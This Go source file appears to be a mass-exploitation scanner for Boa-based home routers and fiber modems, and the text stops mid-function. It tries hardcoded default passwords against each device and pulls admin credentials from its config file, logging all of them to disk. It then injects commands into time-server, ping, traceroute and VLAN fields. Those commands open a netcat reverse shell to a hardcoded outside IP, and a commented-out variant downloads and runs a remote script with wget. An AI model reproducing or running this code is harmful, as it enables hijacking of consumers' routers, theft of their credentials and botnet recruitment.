package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

// 45520
var debug_exploit int = 0

// lsitener ip nc listener_ip
var statusAttempted, statusConns, statusFound, statusLogins, statusRom, statusPayload int64
var ftp_payload string = ";rm+/tmp/f%3bmknod+/tmp/f+p%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+94.154.43.5+9001+>/tmp/f;"
var xftp_payload string = ";rm+/tmp/f%3bmknod+/tmp/f+p%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+94.154.43.5+9001+>/tmp/f;"

// reverse shell ~> ;`rm+/tmp/f%3bmknod+/tmp/f+p%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+94.154.43.5+9001+>/tmp/f`
var wget_payload string = ";`rm+/tmp/f%3bmknod+/tmp/f+p%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+94.154.43.5+9001+>/tmp/f`"

// var wget_payload string = ";`rm+/tmp/f%3bmknod+/tmp/f+p%3bcat+/tmp/f|/bin/sh+-i+2>%261|wget+http://103.130.212.99/b+-O-|+sh+>/tmp/f`"
var boa_auths = [...]string{"admin:admin", "user3:1234", "user3:user3", "user:1234", "user:user", "excitel:1234", "useradmin:1234", "useradmin:useradmin", "admin:vertex25", "admin:1234", "admin:123456", "admin:wifi2016", "excitel:exc@123", "GIGA:GIGA", "user:wlx%H2W6", "GIGATelco:Ga!@telco#$Ga"}

// var boa_auths = [...]string{"admin:1234", "user3:1234", "user:admin", "useradmin:useradmin", "admin:admin", "user:1234", "admin:123456", "excitel:exc@123"}
var xboa_auths = [...]string{"admin:vertex25", "admin:crocus23", "admin:vertex25ektks123", "admin:chillispot"}
var fboa_auths = [...]string{"e8c:e8c", "adsl:realtek", "admin:admin"}

type scanner_info struct {
	sID        string
	user       string
	admin_user []string
	pass       string
	admin_pass []string
	rom_logins int
	ip, port   string
	wan        string
	client     *http.Client
}

func scannerSessProcHeaders(info *scanner_info, resp *http.Response) {
	for k, v := range resp.Header {
		if strings.Contains(string(k), "Set-Cookie") {
			info.sID = GetSessionID(string(v[0]))
			if len(info.sID) > 0 {
				//fmt.Printf("[BOA] Found boa SID \"%s\"!\r\n", info.sID)
			}
		}
	}
}

func scannerSessInit(info *scanner_info) bool {
	url := ""
	url = "http://" + info.ip + ":" + info.port + "/"

	tr := &http.Transport{
		ResponseHeaderTimeout: 10 * time.Second,
		DisableCompression:    true,
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
	}

	info.client = &http.Client{Transport: tr, Timeout: 10 * time.Second}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false
	}

	resp, err := info.client.Do(req)
	if err != nil {
		return false
	}
	_, err = ioutil.ReadAll(resp.Body)

	if err != nil {
		return false
	}

	scannerSessProcHeaders(info, resp)

	resp.Body.Close()

	return true
}

func GetSessionID(str string) (result string) {
	s := strings.Index(str, "SESSIONID=")
	if s == -1 {
		return ""
	}
	s += len("SESSIONID=")
	e := strings.Index(str[s:], ";")
	if e == -1 {
		return ""
	}
	return str[s : s+e]
}

func GetStringInBetween(str string, start string, end string) (result string) {
	s := strings.Index(str, start)
	if s == -1 {
		return ""
	}
	s += len(start)
	e := strings.Index(str[s:], end)
	if e == -1 {
		return ""
	}
	return str[s : s+e]
}

func do_parserom(info *scanner_info, buffer string) bool {
	buffer_lines := strings.Split(buffer, "\n")
	for i := 0; i < len(buffer_lines); i++ {
		if strings.Contains(string(buffer_lines[i]), "<Entry") && strings.Contains(string(buffer_lines[i]), "Active=\"Yes\" username=\"") {
			username := GetStringInBetween(buffer_lines[i], "Active=\"Yes\" username=\"", "\"")
			password := GetStringInBetween(buffer_lines[i], "web_passwd=\"", "\"")
			if len(username) < 0 || len(password) < 0 {
				continue
			}
			info.admin_user = append(info.admin_user, username)
			info.admin_pass = append(info.admin_pass, password)

			info.rom_logins += 1

			if debug_exploit == 1 {
				fmt.Printf("[dbg-BOA] BOA ROM LOGIN FOUND (%s:%s)(%s:%s)\r\n", info.ip, info.port, username, password)
			}

			file, err := os.OpenFile("boa_rom_logins.txt", os.O_RDWR|os.O_APPEND|os.O_CREATE, 0666)
			if err != nil {
				file.Close()
				continue
			}
			fmt.Fprintf(file, "%s:%s\n", string(username), string(password))
			file.Close()
		}
	}

	if info.rom_logins > 0 {
		return true
	}

	return false
}

func do_parsewan(info *scanner_info, buffer string) (string, error) {
	buffer_lines := strings.Split(buffer, "\n")
	for i := 0; i < len(buffer_lines); i++ {
		wan := GetStringInBetween(buffer, "name=\"waninf\"><option value=\"", "\">")
		if len(wan) < 0 {
			continue
		}
		return wan, nil
	}

	return "", errors.New("")
}

func do_login(info *scanner_info, user string, pass string) bool {
	url := ""
	url = "http://" + info.ip + ":" + info.port + "/cgi-bin/index2.asp"

	body_req := "Username=" + user + "&Logoff=0&hLoginTimes=1&hLoginTimes_Zero=0&value_one=1&Password1=" + pass + "&Password2=" + pass + "&logintype=usr&Password=" + pass + "\r\n"

	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body_req)))
	if err != nil {
		return false
	}

	url_origin := ""
	url_origin = "http://" + info.ip + ":" + info.port

	url_referer := ""
	url_referer = "http://" + info.ip + ":" + info.port + "/cgi-bin/index2.asp"

	req.Header.Add("Connection", "keep-alive")
	req.Header.Add("Cache-Control", "max-age=0")
	req.Header.Add("Upgrade-Insecure-Requests", "1")
	req.Header.Add("Origin", url_origin)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Add("Referer", url_referer)
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept-Language", "en-US,en;q=0.9")
	req.Header.Add("Cookie", fmt.Sprintf("LoginTimes=1; SESSIONID=%s; UID=%s; PSW=%s", info.sID, user, pass))
	resp, err := info.client.Do(req)
	if err != nil {
		if debug_exploit == 1 {
			fmt.Printf("[dbg-BOA] ERROR do_login()->client.do() (%s:%s)(%s:%s)\r\n", info.ip, info.port, user, pass)
		}
		return false
	}
	defer resp.Body.Close()
	_, _ = ioutil.ReadAll(resp.Body)

	return true
}

func do_loginout(info *scanner_info, user string, pass string) bool {
	url := ""
	url = "http://" + info.ip + ":" + info.port + "/cgi-bin/logout.cgi"

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false
	}

	url_referer := ""
	url_referer = "http://" + info.ip + ":" + info.port + "/cgi-bin/sta-device.asp"

	req.Header.Add("Connection", "keep-alive")
	req.Header.Add("Upgrade-Insecure-Requests", "1")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Add("Referer", url_referer)
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept-Language", "en-US,en;q=0.9")
	req.Header.Add("Cookie", fmt.Sprintf("SESSIONID=%s; UID=%s; PSW=%s", info.sID, user, pass))
	resp, err := info.client.Do(req)
	if err != nil {
		if debug_exploit == 1 {
			fmt.Printf("[dbg-BOA] ERROR do_loginout()->client.do() (%s:%s)(%s:%s)\r\n", info.ip, info.port, user, pass)
		}
		return false
	}
	defer resp.Body.Close()
	_, _ = ioutil.ReadAll(resp.Body)
	return true
}

func do_logincheck(info *scanner_info, user string, pass string) bool {
	url := ""
	url = "http://" + info.ip + ":" + info.port + "/cgi-bin/content.asp"

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false
	}

	url_referer := ""
	url_referer = "http://" + info.ip + ":" + info.port + "/cgi-bin/index2.asp"

	req.Header.Add("Connection", "keep-alive")
	req.Header.Add("Upgrade-Insecure-Requests", "1")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Add("Referer", url_referer)
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept-Language", "en-US,en;q=0.9")
	req.Header.Add("Cookie", fmt.Sprintf("SESSIONID=%s; UID=%s; PSW=%s", info.sID, user, pass))

	resp, err := info.client.Do(req)
	if err != nil {
		if debug_exploit == 1 {
			fmt.Printf("[dbg-BOA] ERROR do_logincheck()->client.do() (%s:%s)(%s:%s)\r\n", info.ip, info.port, user, pass)
		}
		return false
	}
	defer resp.Body.Close()
	_, _ = ioutil.ReadAll(resp.Body)

	if resp.StatusCode == 200 {
		return true
	}

	return false
}

func do_getrom(info *scanner_info, user string, pass string) bool {
	url := ""
	url = "http://" + info.ip + ":" + info.port + "/romfile.cfg"

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false
	}

	url_referer := ""
	url_referer = "http://" + info.ip + ":" + info.port + "/cgi-bin/index2.asp"

	req.Header.Add("Connection", "keep-alive")
	req.Header.Add("Upgrade-Insecure-Requests", "1")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Add("Referer", url_referer)
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept-Language", "en-US,en;q=0.9")
	req.Header.Add("Cookie", fmt.Sprintf("SESSIONID=%s; UID=%s; PSW=%s", info.sID, user, pass))

	resp, err := info.client.Do(req)
	if err != nil {
		if debug_exploit == 1 {
			fmt.Printf("[dbg-BOA] ERROR do_getrom()->client.do() (%s:%s)(%s:%s)\r\n", info.ip, info.port, user, pass)
		}
		return false
	}

	defer resp.Body.Close()
	resBody, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		return false
	}

	if strings.Contains(string(resBody), "<Entry") && strings.Contains(string(resBody), "web_passwd") {
		return do_parserom(info, string(resBody))
	}

	return false
}

func do_rce(info *scanner_info, user string, pass string) bool {
	url := ""
	url = "http://" + info.ip + ":" + info.port + "/cgi-bin/net-time.asp"

	body_req := "ntpEnabled=on&autotimeFlag=0&CountryName=GMT%%2B08%%3A00&ntpServerOther1Flag=$(" + ftp_payload + ")&ntpServerOther2Flag=$(" + ftp_payload + ")&isNtpServerTypeSupported=1&AddRouteTimeZone=0&ntpServer1=Other&ntpServerOther1=$(" + ftp_payload + ")&ntpServer2=Other&ntpServerOther2=$(" + ftp_payload + ")&cboTimeZone=GMT%%2B08%%3A00&SaveFlag=1"
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body_req)))
	if err != nil {
		return false
	}

	url_origin := ""
	url_origin = "http://" + info.ip + ":" + info.port

	url_referer := ""
	url_referer = "http://" + info.ip + ":" + info.port + "/cgi-bin/diag-quickdiagnose.asp"

	req.Header.Add("Connection", "keep-alive")
	req.Header.Add("Cache-Control", "max-age=0")
	req.Header.Add("Upgrade-Insecure-Requests", "1")
	req.Header.Add("Origin", url_origin)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Add("Referer", url_referer)
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept-Language", "en-US,en;q=0.9")
	req.Header.Add("Cookie", fmt.Sprintf("SESSIONID=%s; UID=%s; PSW=%s", info.sID, user, pass))
	resp, err := info.client.Do(req)
	if err != nil {
		if debug_exploit == 1 {
			fmt.Printf("[dbg-BOA] ERROR do_rce()->client.do() (%s:%s)(%s:%s)\r\n", info.ip, info.port, user, pass)
		}
		return false
	}
	defer resp.Body.Close()
	_, _ = ioutil.ReadAll(resp.Body)

	time.Sleep(3 * time.Second)
	if resp.StatusCode == 200 {
		return true
	}

	return false
}

func do_rce2(info *scanner_info, user string, pass string) bool {
	url := ""
	url = "http://" + info.ip + ":" + info.port + "/cgi-bin/diag-quickdiagnose.asp"

	body_req := "ping_TestType=2&ping_curSetIndex=0&ping_commitflag=1&ping_PingOtherType=Yes&AddRoute_Ping=ppp8&Repetitions=;" + ftp_payload + ";&pingCurrInterface=ppp8&ipaddress=$(" + ftp_payload + ")"
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body_req)))
	if err != nil {
		return false
	}

	url_origin := ""
	url_origin = "http://" + info.ip + ":" + info.port

	url_referer := ""
	url_referer = "http://" + info.ip + ":" + info.port + "/cgi-bin/diag-quickdiagnose.asp"

	req.Header.Add("Connection", "keep-alive")
	req.Header.Add("Cache-Control", "max-age=0")
	req.Header.Add("Upgrade-Insecure-Requests", "1")
	req.Header.Add("Origin", url_origin)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Add("Referer", url_referer)
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept-Language", "en-US,en;q=0.9")
	req.Header.Add("Cookie", fmt.Sprintf("SESSIONID=%s; UID=%s; PSW=%s", info.sID, user, pass))
	resp, err := info.client.Do(req)
	if err != nil {
		if debug_exploit == 1 {
			fmt.Printf("[dbg-BOA] ERROR do_rce()->client.do() (%s:%s)(%s:%s)\r\n", info.ip, info.port, user, pass)
		}
		return false
	}
	defer resp.Body.Close()
	_, _ = ioutil.ReadAll(resp.Body)
	time.Sleep(3 * time.Second)
	if resp.StatusCode == 200 {
		return true
	}

	return false
}

func do_rce3(info *scanner_info, user string, pass string) bool {
	url := ""
	url = "http://" + info.ip + ":" + info.port + "/cgi-bin/app-daily.asp"

	body_req := "chk_0=on&McVlanID=" + ftp_payload + "&ApplyFlag=1&curSetIndex=8&OperatorStyle=Modify"
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body_req)))
	if err != nil {
		return false
	}

	url_origin := ""
	url_origin = "http://" + info.ip + ":" + info.port

	url_referer := ""
	url_referer = "http://" + info.ip + ":" + info.port + "/cgi-bin/diag-quickdiagnose.asp"

	req.Header.Add("Connection", "keep-alive")
	req.Header.Add("Cache-Control", "max-age=0")
	req.Header.Add("Upgrade-Insecure-Requests", "1")
	req.Header.Add("Origin", url_origin)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Add("Referer", url_referer)
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept-Language", "en-US,en;q=0.9")
	req.Header.Add("Cookie", fmt.Sprintf("SESSIONID=%s; UID=%s; PSW=%s", info.sID, user, pass))
	resp, err := info.client.Do(req)
	if err != nil {
		if debug_exploit == 1 {
			fmt.Printf("[dbg-BOA] ERROR do_rce()->client.do() (%s:%s)(%s:%s)\r\n", info.ip, info.port, user, pass)
		}
		return false
	}
	defer resp.Body.Close()
	_, _ = ioutil.ReadAll(resp.Body)
	time.Sleep(3 * time.Second)
	if resp.StatusCode == 200 {
		return true
	}

	return false
}

func boa_work_login(info *scanner_info, user string, pass string) bool {
	if do_login(info, user, pass) == false {
		if debug_exploit == 1 {
			fmt.Printf("[dbg-BOA] ERROR SENDING LOGIN REQUEST (%s:%s)(%s:%s)\r\n", info.ip, info.port, user, pass)
		}
		return false
	}
	if do_logincheck(info, user, pass) == false {
		if debug_exploit == 1 {
			fmt.Printf("[dbg-BOA] ERROR LOGGING IN (%s:%s)(%s:%s)\r\n", info.ip, info.port, user, pass)
		}
		return false
	}
	statusLogins++
	file, err := os.OpenFile("boa_logins.txt", os.O_RDWR|os.O_APPEND|os.O_CREATE, 0666)
	if err != nil {
		file.Close()
		return true
	}
	fmt.Fprintf(file, "%s:%s %s:%s\n", info.ip, info.port, string(user), string(pass))
	file.Close()
	return true
}

func process_boa(info *scanner_info) {
	info.client.CloseIdleConnections()
	scannerSessInit(info)
	for i := 0; i < 4; i++ {
		credential := strings.Split(boa_auths[rand.Intn(len(boa_auths))], ":")
		if boa_work_login(info, credential[0], credential[1]) {
			if do_getrom(info, credential[0], credential[1]) { // we have admin account now relog and send payload
				statusRom++
				success := 0
				do_loginout(info, credential[0], credential[1])
				info.client.CloseIdleConnections()
				scannerSessInit(info)
				for ii := 0; ii < info.rom_logins; ii++ {
					if boa_work_login(info, info.admin_user[ii], info.admin_pass[ii]) {
						if do_rce(info, info.admin_user[ii], info.admin_pass[ii]) {
							fmt.Printf("(BOA) ROM NET-TIME RCE SUCCESS %s:%s %s:%s\r\n", info.ip, info.port, info.admin_user, info.admin_pass[ii])
							success = 1
						}

						if do_rce2(info, info.admin_user[ii], info.admin_pass[ii]) {
							fmt.Printf("(BOA) ROM PING RCE SUCCESS %s:%s %s:%s\r\n", info.ip, info.port, info.admin_user, info.admin_pass[ii])
							success = 1
						}

						if do_rce3(info, info.admin_user[ii], info.admin_pass[ii]) {
							fmt.Printf("(BOA) ROM APP-DAILY RCE SUCCESS %s:%s %s:%s\r\n", info.ip, info.port, info.admin_user, info.admin_pass[ii])
							success = 1
						}

						if success == 1 {
							statusPayload++
							break
						} else {
							if debug_exploit == 1 {
								fmt.Printf("[dbg-BOA] ERROR ROM RCE IN (%s:%s)(%s:%s)\r\n", info.ip, info.port, info.admin_user[ii], info.admin_pass[ii])
							}
							do_loginout(info, info.admin_user[ii], info.admin_pass[ii])
							info.client.CloseIdleConnections()
							scannerSessInit(info)
							continue
						}
					}
				}
				if success == 1 {
					time.Sleep(15 * time.Second)
					do_loginout(info, credential[0], credential[1])
					break
				}
			}
			success := 0
			if do_rce(info, credential[0], credential[1]) {
				fmt.Printf("(BOA) NET-TIME RCE SUCCESS %s:%s %s:%s\r\n", info.ip, info.port, credential[0], credential[1])
				success = 1
			}
			if do_rce2(info, credential[0], credential[1]) {
				fmt.Printf("(BOA) PING RCE SUCCESS %s:%s %s:%s\r\n", info.ip, info.port, credential[0], credential[1])
				success = 1
			}
			if do_rce3(info, credential[0], credential[1]) {
				fmt.Printf("(BOA) APP-DAILY RCE SUCCESS %s:%s %s:%s\r\n", info.ip, info.port, credential[0], credential[1])
				success = 1
			}

			if success == 1 {
				time.Sleep(15 * time.Second)
				do_loginout(info, credential[0], credential[1])
				break
			} else {
				if debug_exploit == 1 {
					fmt.Printf("[dbg-BOA] ERROR RCE IN (%s:%s)(%s:%s)\r\n", info.ip, info.port, credential[0], credential[1])
				}
				do_loginout(info, credential[0], credential[1])
				info.client.CloseIdleConnections()
				scannerSessInit(info)
				continue
			}
		}
		info.client.CloseIdleConnections()
		scannerSessInit(info)
		continue
	}
}

func do_xrce(info *scanner_info, user string, pass string) bool {
	url := ""
	url = "http://" + info.ip + ":" + info.port + "/cgi-bin/tools_time.asp"

	body_req := "SaveTime=1&uiCurrentTime2=2&RefreshTimeSel=0&Timezone_active=Yes&uiCurrentTime1=Fri+Feb+17+03%3A17%3A43+2021&ToolsTimeSetFlag=0&uiRadioValue=0&uiClearPCSyncFlag=0&uiwPCdateMonth=2&uiwPCdateDay=16&uiwPCdateYear=2022&uiwPCdateHour=11&uiwPCdateMinute=16&uiwPCdateSec=41&uiCurTime=Fri+Sep+17+03%3A17%3A43+2021%0D%0A&uiTimezoneType=0&uiViewSyncWith=0&uiPCdateMonth=1&uiPCdateDay=&uiPCdateYear=&uiPCdateHour=&uiPCdateMinute=&uiPCdateSec=&uiViewdateToolsTZ=GMT%2B09%3A00&uiViewdateDS=Enable&uiViewSNTPServer=$(" + xftp_payload + ")&uiViewSNTPServer2=$(" + xftp_payload + ")&uiViewSNTPServer3=pool.ntp.org&ntp2ServerFlag=N%2FA&ntp3ServerFlag=Yes"

	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body_req)))
	if err != nil {
		return false
	}

	url_origin := ""
	url_origin = "http://" + info.ip + ":" + info.port

	url_referer := ""
	url_referer = "http://" + info.ip + ":" + info.port + "/cgi-bin/tools_time.asp"

	req.SetBasicAuth(user, pass)
	req.Header.Add("Origin", url_origin)
	req.Header.Add("Referer", url_referer)
	req.Header.Add("Cookie", fmt.Sprintf("SESSIONID=%s", info.sID))
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	resp, err := info.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	_, err = ioutil.ReadAll(resp.Body)

	if err != nil {
		return false
	}

	if resp.StatusCode == 200 {
		return true
	}

	return false
}

func do_xrce2(info *scanner_info, user string, pass string) bool {
	url := ""
	url = "http://" + info.ip + ":" + info.port + "/cgi-bin/tools_test.asp"

	body_req := "testFlag=1&Test_PVC=0&pingtest_type=Yes&IP=$(" + xftp_payload + ")&pingtestsite_type=No"

	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body_req)))
	if err != nil {
		return false
	}

	url_origin := ""
	url_origin = "http://" + info.ip + ":" + info.port

	url_referer := ""
	url_referer = "http://" + info.ip + ":" + info.port + "/cgi-bin/tools_test.asp"

	req.SetBasicAuth(user, pass)
	req.Header.Add("Origin", url_origin)
	req.Header.Add("Referer", url_referer)
	req.Header.Add("Cookie", fmt.Sprintf("SESSIONID=%s", info.sID))
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	resp, err := info.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	_, err = ioutil.ReadAll(resp.Body)

	if err != nil {
		return false
	}

	if resp.StatusCode == 200 {
		return true
	}

	return false
}

func do_xlogin(info *scanner_info, user string, pass string) bool {
	url := ""

	url = "http://" + info.ip + ":" + info.port + "/romfile.cfg"

	body_req := "Username=" + user + "&Logoff=0&hLoginTimes=1&hLoginTimes_Zero=0&value_one=1&Password1=" + pass + "&Password2=" + pass + "&logintype=usr&Password=" + pass + "\r\n"

	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body_req)))
	if err != nil {
		return false
	}

	url_referer := ""
	url_referer = "http://" + info.ip + ":" + info.port + "/cgi-bin/tools_config_backup.asp"

	req.SetBasicAuth(user, pass)
	req.Header.Add("Referer", url_referer)
	req.Header.Add("Cookie", "SESSIONID=2160a7c2")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	resp, err := info.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	_, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return false
	}

	if resp.StatusCode == 200 {
		return true
	}

	return false
}

func xboa_work_login(info *scanner_info, user string, pass string) bool {
	if do_xlogin(info, user, pass) == false {
		return false
	}
	return true
}

func process_xboa(info *scanner_info) {
	for i := 0; i < 4; i++ {
		credential := strings.Split(xboa_auths[rand.Intn(len(xboa_auths))], ":")
		success := 0
		if do_xrce(info, credential[0], credential[1]) {
			fmt.Printf("(xBOA) RCE NTP SUCCESS %s:%s %s:%s\r\n", info.ip, info.port, credential[0], credential[1])
			success = 1
		} else if do_xrce2(info, credential[0], credential[1]) {
			fmt.Printf("(xBOA) RCE PING SUCCESS %s:%s %s:%s\r\n", info.ip, info.port, credential[0], credential[1])
			success = 1
		}
		if success == 1 {
			statusLogins++
			file, err := os.OpenFile("xboa_logins.txt", os.O_RDWR|os.O_APPEND|os.O_CREATE, 0666)
			if err != nil {
				file.Close()
			} else {
				fmt.Fprintf(file, "%s:%s %s:%s\n", info.ip, info.port, string(credential[0]), string(credential[1]))
				file.Close()
			}
			statusPayload++
			break
		}
		continue
	}
}

func do_frce2(info *scanner_info, user string, pass string) bool {
	url := ""
	url = "http://" + info.ip + ":" + info.port + "/boaform/admin/formPing"

	body_req := "target_addr=" + wget_payload + "&waninf=" + info.wan + "\r\n\r\n"

	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body_req)))
	if err != nil {
		return false
	}

	url_origin := ""
	url_origin = "http://" + info.ip + ":" + info.port

	url_referer := ""
	url_referer = "http://" + info.ip + ":" + info.port + "/diag_ping_admin.asp"

	req.SetBasicAuth(user, pass)
	req.Header.Add("Connection", "keep-alive")
	req.Header.Add("Cache-Control", "max-age=0")
	req.Header.Add("Upgrade-Insecure-Requests", "1")
	req.Header.Add("Origin", url_origin)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Add("Referer", url_referer)
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept-Language", "en-US,en;q=0.9")
	resp, err := info.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	_, err = ioutil.ReadAll(resp.Body)

	if err != nil {
		return false
	}

	if resp.StatusCode == 200 {
		return true
	}

	return false
}

func do_frce(info *scanner_info, user string, pass string) bool {
	url := ""
	url = "http://" + info.ip + ":" + info.port + "/boaform/admin/formTracert"

	body_req := "target_addr=" + wget_payload + "&waninf=" + info.wan + "\r\n\r\n"

	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body_req)))
	if err != nil {
		return false
	}

	url_origin := ""
	url_origin = "http://" + info.ip + ":" + info.port

	url_referer := ""
	url_referer = "http://" + info.ip + ":" + info.port + "/diag_ping_admin.asp"

	req.SetBasicAuth(user, pass)
	req.Header.Add("Connection", "keep-alive")
	req.Header.Add("Cache-Control", "max-age=0")
	req.Header.Add("Upgrade-Insecure-Requests", "1")
	req.Header.Add("Origin", url_origin)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Add("Referer", url_referer)
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept-Language", "en-US,en;q=0.9")
	resp, err := info.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	_, err = ioutil.ReadAll(resp.Body)

	if err != nil {
		return false
	}

	if resp.StatusCode == 200 {
		return true
	}

	return false
}

func do_fgetwanf(info *scanner_info, user string, pass string) bool {
	url := ""
	url = "http://" + info.ip + ":" + info.port + "/diag_ping.asp"

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false
	}

	url_referer := ""
	url_referer = "http://" + info.ip + ":" + info.port + "/diag_tracert_admin_en.asp"

	req.Header.Add("Connection", "keep-alive")
	req.Header.Add("Cache-Control", "max-age=0")
	req.Header.Add("Upgrade-Insecure-Requests", "1")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Add("Referer", url_referer)
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept-Language", "en-US,en;q=0.9")

	resp, err := info.client.Do(req)
	if err != nil {
		return false
	}

	defer resp.Body.Close()
	resBody, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		return false
	}

	if strings.Contains(string(resBody), "name=\"waninf\"><option value=\"") {
		wan_name, err := do_parsewan(info, string(resBody))
		if err != nil {
			return false
		}
		info.wan = wan_name
		return true
	}

	return false
}

func do_flogin(info *scanner_info, user string, pass string) bool {
	url := ""
	url = "http://" + info.ip + ":" + info.port + "/boaform/admin/formLogin"

	body_req := "username=" + user + "&psd=" + pass + "\r\n"

	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body_req)))
	if err != nil {
		return false
	}

	url_origin := ""
	url_origin = "http://" + info.ip + ":" + info.port

	url_referer := ""
	url_referer = "http://" + info.ip + ":" + info.port + "/admin/login.asp"

	req.SetBasicAuth(user, pass)
	req.Header.Add("Origin", url_origin)
	req.Header.Add("Referer", url_referer)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	resp, err := info.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	resBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false
	}

	if strings.Contains(string(resBody), "invalid username!") || strings.Contains(string(resBody), "bad password!") || strings.Contains(string(resBody), "you have logined error 3 consecutive times, please relogin 1 minute later!") || strings.Contains(string(resBody), "another user have logined in") {
		return false
	}

	return true
}

func fboa_work_login(info *scanner_info, user string, pass string) bool {
	if do_flogin(info, user, pass) == false {
		return false
	}
	statusLogins++
	file, err := os.OpenFile("fboa_logins.txt", os.O_RDWR|os.O_APPEND|os.O_CREATE, 0666)
	if err != nil {
		file.Close()
		return true
	}
	fmt.Fprintf(file, "%s:%s %s:%s\n", info.ip, info.port, string(user), string(pass))
	file.Close()
	return true
}

func process_fboa(info *scanner_info) {
	for i := 0; i < len(fboa_auths); i++ {
		credential := strings.Split(fboa_auths[i], ":")
		if fboa_work_login(info, credential[0], credential[1]) {
			if do_fgetwanf(info, credential[0], credential[1]) == false {
				info.wan = "1_INTERNET_R_VID_"
			} else {
				//fmt.Printf("[fBOA] Found fiber boa WAN Interface %s:%s %s:%s \"%s\"! Attempting rce\r\n", info.ip, info.port, credential[0], credential[1], info.wan)
			}
			success := 0
			if do_frce(info, credential[0], credential[1]) {
				fmt.Printf("(fBOA) RCE TRACERT SUCCESS %s:%s %s:%s\r\n", info.ip, info.port, credential[0], credential[1])
				success = 1
			} else if do_frce2(info, credential[0], credential[1]) {
				fmt.Printf("(fBOA) RCE PING SUCCESS %s:%s %s:%s\r\n", info.ip, info.port, credential[0], credential[1])
				success = 1
			}
			if success == 1 {
				statusPayload++
				break
			}
			continue
		}
		continue
	}
}

func do_hdr_check(info *scanner_info) {
	url := ""
